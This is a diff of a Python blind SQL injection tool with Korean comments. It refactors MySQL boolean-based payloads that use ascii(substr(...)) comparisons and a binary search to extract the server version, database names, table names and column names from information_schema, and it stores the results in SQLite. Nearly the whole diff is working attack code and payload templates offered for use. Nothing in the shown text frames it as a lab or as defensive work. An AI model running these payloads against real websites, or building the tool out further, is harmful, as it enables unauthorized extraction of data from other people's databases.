@@ -1,9 +1,9 @@
 ####################
 # 
-# 1. POST 문제 해결
-# 2. --basic 선택 시 에러 해결
-# 3. 데이터 출력 구현,  조회해서 나온 값을 (테이블 생성하고 각 컬럼들 값들을 SQLite에 그대로 저장)
-# 4. 다른 데이터베이스 페이로드 생성
+# 1. --basic 선택 시 에러 해결 -> 완료
+# 2. POST 문제 해결
+# 3. 다른 데이터베이스 페이로드 생성
+# 4. 데이터 출력 구현,  조회해서 나온 값을 (테이블 생성하고 각 컬럼들 값들을 SQLite에 그대로 저장)
 # 
 ###############
 
@@ -232,35 +232,36 @@ def setpayload():
 
 	elif dbms == 'mysql':
 		if args.basic:
-			print(f"{Colors.RED}{Colors.UNDERLINE}[*] MySQL 기본 정보 출력 Start{Colors.END}\n")
+			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 기본 정보 출력 Start{Colors.END}\n")
 			payloads = {
 				'count': "SELECT count(*) FROM @@version",
 				'len': "(SELECT length((SELECT @@version)))>{mid_val}",
-				'version' : "ascii(substr((SELECT @@version),{substr_index},1))>{mid_val}"      
+				'version' : "ascii(substr((SELECT @@version),{substr_index},1))>{mid_val}",
 			}
 		if args.dbs:
-			print(f"{Colors.RED}{Colors.UNDERLINE}[*] MySQL DB 출력 Start{Colors.END}\n")
+			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL DB 출력 Start{Colors.END}\n")
 			payloads = {
 				'count' : "(SELECT count(*) FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema'))>{mid_val}",
 				'len' : "(SELECT length((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1)))>{mid_val}",
 				'dbs' : "ascii(substr((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1),{substr_index},1))>{mid_val}"
 			}
 		if args.tables:
-			print(f"{Colors.RED}{Colors.UNDERLINE}[*] MySQL 테이블 출력 Start{Colors.END}\n")
+			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 테이블 출력 Start{Colors.END}\n")
 			payloads = {
 				'count' : "(SELECT count(*) FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}'))>{mid_val}",
 				'len' : "(SELECT length((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1)))>{mid_val}",
 				'tables' : "ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
 			}
 		if args.columns:
-			print(f"{Colors.RED}{Colors.UNDERLINE}[*] MySQL 컬럼 출력 Start{Colors.END}\n")
+			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 컬럼 출력 Start{Colors.END}\n")
 			payloads = {
 				'count' : "(SELECT count(*) FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}'))>{mid_val}",
 				'len' : "(SELECT length((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1)))>{mid_val}",
 				'columns' : "ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
 			}
-		else:
-			print("Use --help for more info. (mysql)")
+		# else:
+		# 	print("Use --help for more info. (mysql)")
+		# 	print(f"args.basic: {args.basic}, args.dbs: {args.dbs}, args.tables: {args.tables}, args.columns: {args.columns}")
 
 	# elif dbms == 'mssql':
 	# 	if args.basic:
@@ -338,7 +339,6 @@ def connection(data, method, url, path, headers):
 	return 0    # false
 
 def query_start():
-	# result_table_create() # 결과를 저장할 SQLite 테이블 생성
 	payloads = setpayload() # 인수에 따른 페이로드 셋팅
 	data, condition = parse_request(REQUEST_STRING) # 응답데이터 파싱
 	check_condition(**data) # True 응답 길이 저장 (참거짓 구분 용도)
@@ -356,85 +356,61 @@ def query_start():
 	result_data = {}
 	data_len  = 0
 	dic = {} # name_str_list 2차원 배열을 엑셀에 넣기위해 딕셔너리형으로 변환 해서 넣을 변수
-	select_table_one = None
+	select_tables = [None] # --dbs, --tables 를 실행할때는 None으로 설정
+
 
 	if args.select_table != None: # 테이블의 컬럼을 여러개 선택하는 경우 ex) -C blog, movies
-		select_tables = args.select_table.split(',')
-		for select_table_one in select_tables: # 컬럼 여러개 선택한 경우 갯수만큼 반복
-			select_table_one = select_table_one.replace("'","").strip()
+		select_tables = [] # --Columns의 경우 None 값 초기화
+		select_tmp = args.select_table.split(',')
+		for tmp in select_tmp: # 컬럼 여러개 선택한 경우 갯수만큼 반복
+			tmp2 = tmp.replace("'","").strip()			
+			select_tables.append(tmp2)
 
-			row_count = recursive(0, 127, data, result_payload['count'],None, None, args.select_db, select_table_one, None)
+	for select_table_one in select_tables:
+		row_count = recursive(0, 127, data, result_payload['count'],None, None, args.select_db, select_table_one, None)
 
-			# name_str_list =[[None] * 1 for _ in range(row_count)] # 2차원 배열 생성 열을 지정할 방법 생각해야됨
-			print(f"[*] '{select_table_one}' 레코드 수 : {str(row_count)}")
-			for rows in range(0, row_count, 1):  # 레코드 갯수 만큼 반복  # range(row_count)로 해도됨
-				for key, value in list(result_payload.items())[1:]: #딕셔너리를 리스트로 변환 후 첫번째 값(count)는 제외하고 실행 
-					if key == 'len':
-						data_len  = recursive(0, 127, data, value, None, rows, args.select_db, select_table_one, None)
-						# print(f"{select_table_one} 데이터 길이 : " + str(data_len))
-					else:
-						name_str = ""
-						for substr_index in range(0, data_len, 1): # 데이터 글자 수 만큼 반복
-							name_str += chr(recursive(0, 127, data, value, substr_index+1, rows, args.select_db, select_table_one, None))
-							# name_str_list[rows][0] = name_str
-							# print(name_str)
-						SQLiteProcessor.result_set_name(name_str, select_table_one) # SQLite에 데이터 저장
-						# result_set_name(name_str, select_table_one)
-						result_tmp.append(name_str)
-						print(result_tmp)
+		if select_table_one:
+			print(f"{Colors.LIGHT_BLUE}[*] '{select_table_one}' 레코드 수 : {str(row_count)}{Colors.END}")
+		else:
+			print(f"{Colors.LIGHT_BLUE}[*] 레코드 수 : {str(row_count)}{Colors.END}")
+
+		for rows in range(0, row_count, 1):  # 레코드 갯수 만큼 반복  # range(row_count)로 해도됨
+			for key, value in list(result_payload.items())[1:]: #딕셔너리를 리스트로 변환 후 첫번째 값(count)는 제외하고 실행 
+				if key == 'len':
+					data_len  = recursive(0, 127, data, value, None, rows, args.select_db, select_table_one, None)
+					# print(f"{select_table_one} 데이터 길이 : " + str(data_len))
+				else:
+					name_str = ""
+					for substr_index in range(0, data_len, 1): # 데이터 글자 수 만큼 반복
+						name_str += chr(recursive(0, 127, data, value, substr_index+1, rows, args.select_db, select_table_one, None))
+						# print(name_str)
+					SQLiteProcessor.result_set_name(name_str, select_table_one) # SQLite에 데이터 저장
+					result_tmp.append(name_str)
+					print(result_tmp)
 						
 			# table_name =		
-			result_data[select_table_one] = result_tmp
-			print(f"{Colors.PURPLE}[*] '{select_table_one}'  데이터 : {result_data[select_table_one]}{Colors.END}")
-			result_tmp = [] # 레코드 모두 추출 후 초기화
+		result_data[select_table_one] = result_tmp
+		if select_table_one: #
+			print(f"{Colors.LIGHT_BLUE}[*] '{select_table_one}' 데이터 : {result_data[select_table_one]}{Colors.END}")
+		else:
+			print(f"{Colors.LIGHT_BLUE}[*] 데이터 : {result_data[select_table_one]}{Colors.END}")
+		result_tmp = [] # 레코드 모두 추출 후 초기화
 
-		print(f"{Colors.UNDERLINE}[*] SQLite 저장 완료!!{Colors.END}")
-		print(f"\n{Colors.RED}{Colors.UNDERLINE}[*] 최종 결과{Colors.END}")
-		for key, value in result_data.items(): 
-			print(f"{Colors.LIGHT_BLUE}{key}{Colors.END} : {Colors.GREEN}{value}{Colors.END}")	
-		print("\n")	
-				# print(f"[+] {rows+1} 행 출력 : {name_str}")
- 
-	# for rows in range(0, row_count, 1): # range(row_count)로 해도됨
-
-	# 	for cols in range(0, row_count, 1):
-	# 		print(cols)
-	# 		for key, value in result_payload.items():
-	# 			if key == 'count':
-	# 				continue
-	# 			elif key == 'len':
-	# 				data_len  = recursive(0, 127, data, value, None, rows, None)
-	# 				# print("길이 : " + str(data_len))
-	# 			else:
-	# 				name_str = ""
-	# 				for substr_index in range(0, data_len, 1):
-	# 					name_str += chr(recursive(0, 127, data, value, substr_index+1, rows, None))
-	# 					name_str_list[rows][0] = name_str
-	# 					# print(name_str)
-	# 				print(f"[+] {rows+1} 행 출력 : {name_str}")
-	
-
-		# 			print(name_str)
-		# name_tmp.append(name_str)
-		# name_str = ""
-		# name_str_list[rows][0] = name_tmp
-		# name_tmp = []
-
-	# print("\n[*] 최종 데이터 출력")
-	# for i in name_str_list :
-	# 	for j in i:
-	# 		print(j,end=" ")
-	# 	print()
-	
-	# conn.close()
-
+	print(f"{Colors.LIGHT_RED}[*] SQLite 저장 완료{Colors.END}")
+	print(f"\n{Colors.LIGHT_RED}{Colors.BOLD}{Colors.UNDERLINE}[*] 최종 결과{Colors.END}")
+	for key, value in result_data.items(): 
+		if key:
+			print(f"{Colors.LIGHT_BLUE}{key}{Colors.END} : {Colors.GREEN}{value}{Colors.END}")
+		else:
+			print(f"{Colors.LIGHT_BLUE}{Colors.END}{Colors.GREEN}{value}{Colors.END}")
+	print("\n")	
+		
 if __name__ == '__main__':
 	arg_processor = ArgumentProcessor()
 	args = arg_processor.args # 인스턴스 생성
-	# print(args)
 	SQLiteProcessor() # SQLite 초기화
 
-	print (f"\n{Colors.RED}{Colors.BOLD}================================================================={Colors.END}")
-	print (f"{Colors.RED}{Colors.BOLD}                    Blind SQL Injection START{Colors.END}")
-	print (f"{Colors.RED}{Colors.BOLD}================================================================={Colors.END}\n")
+	print (f"\n{Colors.LIGHT_RED}{Colors.BOLD}================================================================={Colors.END}")
+	print (f"{Colors.LIGHT_RED}{Colors.BOLD}                    Blind SQL Injection START{Colors.END}")
+	print (f"{Colors.LIGHT_RED}{Colors.BOLD}================================================================={Colors.END}\n")
 	query_start()
